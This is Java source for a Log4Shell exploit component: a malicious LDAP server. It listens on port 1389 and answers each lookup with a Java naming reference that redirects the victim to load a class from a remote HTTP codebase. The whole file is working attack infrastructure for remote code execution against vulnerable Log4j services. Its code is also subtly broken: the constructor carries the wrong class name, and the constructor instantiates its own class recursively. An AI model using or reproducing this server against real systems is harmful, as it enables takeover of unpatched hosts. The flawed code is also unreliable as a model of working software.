package dev.babebbu.log4shell.exploit.ldap;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import lombok.SneakyThrows;
import org.springframework.stereotype.Service;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.URL;

@Service
public class LdapServer extends InMemoryOperationInterceptor {

    private final String LDAP_LISTENING_ADDRESS = "0.0.0.0";
    private final int LDAP_LISTENING_PORT = 1389;
    private final String HTTP_BASE_URL = "http://hostname_or_domain_or_ip:port_if_applicable/";

    public InMemoryOperationInterceptor() {
        try {
            InMemoryDirectoryServerConfig serverConfig = new InMemoryDirectoryServerConfig("dc=example,dc=com");

            serverConfig.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    LDAP_LISTENING_PORT,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            serverConfig.addInMemoryOperationInterceptor(new LdapServer());
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(serverConfig);
            ds.startListening();
            System.out.println("[+] LDAP Server Start Listening on " + LDAP_LISTENING_ADDRESS + "...");
        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    @SneakyThrows
    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
        String className = result.getRequest().getBaseDN();
        System.out.println("[+] Received LDAP Query: " + className);

        Entry entry = new Entry(className);
        URL toUrl = new URL(new URL(HTTP_BASE_URL), className + ".class");
        System.out.println("[+] Send LDAP reference result for " + className + " redirecting to " + toUrl);
        entry.addAttribute("javaCodeBase", HTTP_BASE_URL);
        entry.addAttribute("javaClassName", className);
        entry.addAttribute("objectClass", "javaNamingReference");
        entry.addAttribute("javaFactory", className);
        result.sendSearchEntry(entry);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

}
